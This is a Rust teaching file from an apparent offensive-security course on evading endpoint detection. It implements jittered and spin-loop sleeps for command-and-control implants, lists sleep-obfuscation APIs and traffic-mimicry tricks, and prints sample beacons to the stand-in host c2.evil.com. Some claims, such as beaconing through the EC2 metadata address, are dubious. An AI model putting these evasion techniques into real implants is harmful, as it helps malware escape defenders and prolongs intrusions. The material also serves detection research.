// 💖 RustLearning — Offensive: Evasion
// File: 02_sleep_jitter.rs
// What: Sleep with RANDOM jitter to evade behavioral detection.
// EDR detects REGULAR beaconing intervals. Random = harder to detect.
//
// Run:  rustc 02_sleep_jitter.rs && ./02_sleep_jitter

/// BEACONING = an implant checks in with its C2 at regular intervals.
/// EDR detects: "Every 60 seconds on the dot, Process X calls out."
/// EVASION: Add random JITTER to the sleep time.
///          Instead of 60s → 60 + random(-10, +10) = 50-70s
///
/// Also: Sleep OBFUSCATION (EDR hooks sleep functions):
///       1. NtDelayExecution (WinAPI) — EDR hooks this
///       2. Custom sleep (spin loop) — no API call, hard to hook
///       3. Timer-based sleep — use hardware timers, not WinAPI

use std::time::{Duration, Instant};
use std::thread;

/// Sleep with jitter — random variation around a base duration
fn sleep_with_jitter(base_ms: u64, jitter_ms: u64) {
    // Generate random jitter amount (+/- jitter_ms/2)
    let jitter = if jitter_ms > 0 {
        let half = jitter_ms / 2;
        // Simple pseudo-random (not cryptographically secure)
        let pseudo_random = (Instant::now().elapsed().as_nanos() as u64) % (jitter_ms + 1);
        (pseudo_random as i64) - (half as i64)
    } else {
        0
    };
    
    let actual_ms = (base_ms as i64 + jitter).max(1) as u64;  // Min 1ms
    let duration = Duration::from_millis(actual_ms);
    
    println!("   Sleep: base={}ms, jitter={}ms, actual={}ms", 
             base_ms, jitter_ms, actual_ms);
    
    thread::sleep(duration);
}

/// Custom SPIN-LOOP sleep (no OS sleep call)
/// Avoids EDR hooks on NtDelayExecution/Sleep()
fn spin_sleep(target_ms: u64) {
    let start = Instant::now();
    let target = Duration::from_millis(target_ms);
    
    // Busy-wait loop — 100% CPU but no kernel sleep call
    // In real code: you'd use a more sophisticated approach
    // to avoid pegging the CPU (which is ALSO suspicious)
    loop {
        if start.elapsed() >= target {
            break;
        }
        // CPU hint: yield to reduce power usage
        std::hint::spin_loop();
    }
    
    println!("   Spin sleep completed: {}ms", target_ms);
}

/// Simulate beaconing with and without jitter
fn simulate_beaconing(beacon_count: u32, with_jitter: bool) {
    println!("");
    if with_jitter {
        println!("   🔀 WITH JITTER (harder to detect):");
    } else {
        println!("   📏 WITHOUT JITTER (easy to detect):");
    }
    println!("");
    
    for i in 0..beacon_count {
        if with_jitter {
            sleep_with_jitter(50, 40);  // 50ms base, +/- 20ms jitter
        } else {
            println!("   Sleep: exactly 50ms (always the same — pattern!)");
            thread::sleep(Duration::from_millis(50));
        }
        println!("   Beacon {}: sent 'still here' packet", i + 1);
    }
}

fn main() {
    println!("💖 Sleep Jitter — Evade Timing Analysis");
    println!("");
    
    // =========================================================
    // THE PROBLEM: Regular intervals are DETECTABLE
    // =========================================================
    
    println!("── THE PROBLEM ──");
    println!("");
    println!("EDR builds a TIMELINE of every process's network calls:");
    println!("");
    println!("   12:00:00 — Process A → GET  c2.evil.com/beacon");
    println!("   12:01:00 — Process A → GET  c2.evil.com/beacon");
    println!("   12:02:00 — Process A → GET  c2.evil.com/beacon");
    println!("   12:03:00 — Process A → GET  c2.evil.com/beacon");
    println!("");
    println!("   ⚠️ Pattern detected: 60-second beacon interval! ⚠️");
    println!("");
    println!("With JITTER:");
    println!("");
    println!("   12:00:07 — Process A → GET  c2.evil.com/beacon");
    println!("   12:01:23 — Process A → GET  c2.evil.com/beacon");
    println!("   12:02:45 — Process A → GET  c2.evil.com/beacon");
    println!("   12:03:52 — Process A → GET  c2.evil.com/beacon");
    println!("");
    println!("   ✅ No clear pattern — could be user activity!");
    println!("");
    
    // =========================================================
    // DEMO: With and without jitter
    // =========================================================
    
    println!("── DEMO ──");
    println!("");
    
    simulate_beaconing(3, false);  // Without jitter
    simulate_beaconing(3, true);   // With jitter
    
    println!("");
    
    // =========================================================
    // SLEEP OBFUSCATION — Techniques
    // =========================================================
    
    println!("── SLEEP OBFUSCATION TECHNIQUES ──");
    println!("");
    println!("1. NtDelayExecution (WinAPI) — EDR HOOKS THIS");
    println!("   EDR replaces NtDelayExecution with its own version.");
    println!("   When you call Sleep(60000), EDR sees it.");
    println!("");
    println!("2. WaitForSingleObject with timer — similar issue");
    println!("   EDR hooks timer functions too.");
    println!("");
    println!("3. SPIN LOOP (busy wait) — NO API CALL");
    println!("   Just loop until time passes.");
    println!("   ⚠️ 100% CPU usage is ALSO suspicious!");
    println!("   ⚠️ Laptop fans spin up = physical detection");
    println!("");
    println!("4. SetWaitableTimer with callback");
    println!("   More obscure API, less hooked.");
    println!("");
    println!("5. CreateTimerQueue + callback");
    println!("   Even more obscure.");
    println!("");
    println!("6. Hardware timers (RDTSC instruction)");
    println!("   Read CPU timestamp counter directly.");
    println!("   In Rust: core::arch::x86_64::_rdtsc()");
    println!("");
    
    // =========================================================
    // DEMO: Spin sleep
    // =========================================================
    
    println!("── SPIN SLEEP DEMO (10ms) ──");
    println!("");
    println!("   (This would use 100% CPU for 10ms)");
    println!("   (In real code: mix spin + real sleep to reduce CPU)");
    spin_sleep(10);
    println!("");
    
    // =========================================================
    // ADVANCED: EC2-style jitter (randomized intervals)
    // =========================================================
    
    println!("── ADVANCED: EC2 Beaconing Pattern ──");
    println!("");
    println!("Real malware doesn't just jitter the sleep.");
    println!("It mimics LEGITIMATE traffic patterns.");
    println!("");
    println!("Amazon EC2 metadata: 169.254.169.254");
    println!("Many legitimate tools query this IP.");
    println!("Malware can BEACON to this IP (but actually goes to C2).");
    println!("");
    println!("Pattern mimicry:");
    println!("   - Average of 5-10 beacons per session");
    println!("   - Random intervals of 30-120 seconds");
    println!("   - Minute-long active periods");
    println!("   - Hours of silence between sessions");
    println!("   - TLS ClientHello to cloudflare.com (blends in)");
    println!("");
    
    // =========================================================
    // EDR HEURISTICS — What they look for
    // =========================================================
    
    println!("── EDR BEHAVIORAL HEURISTICS ──");
    println!("");
    println!("Modern EDR doesn't just look at intervals.");
    println!("It builds a BEHAVIOR PROFILE:");
    println!("");
    println!("   ✅ Normal app: calls Sleep() with VARIED durations");
    println!("   ✅ Normal app: uses sleep for user interaction delays");
    println!("   ✅ Normal app: sleeps are CORRELATED with user input");
    println!("");
    println!("   🔴 Malware: calls Sleep() with CONSTANT durations");
    println!("   🔴 Malware: sleeps WITHOUT user input correlation");
    println!("   🔴 Malware: the THREAD that sleeps also does NETWORK I/O");
    println!("");
    println!("Rust's thread::sleep() is the SAME as C's Sleep().");
    println!("But Rust's type safety means your LOADER is correct.");
    println!("No buffer overflows. No crashes. Just clean execution. 💖");
    println!("");
    
    println!("═══════════════════════════════════════");
    println!("  ✅ Regular intervals = DETECTABLE");
    println!("  ✅ Jitter = random variation in sleep times");
    println!("  ✅ Spin sleep = no API call (but high CPU)");
    println!("  ✅ EDR looks for patterns, not just intervals");
    println!("");
    println!("  🔥 In C: Sleep() is hooked by EDR");
    println!("  🔥 In Rust: same limitation, but safe code");
    println!("");
    println!("  ✅ Next: 03_sandbox_detect.rs — VM detection");
    println!("═══════════════════════════════════════");
}
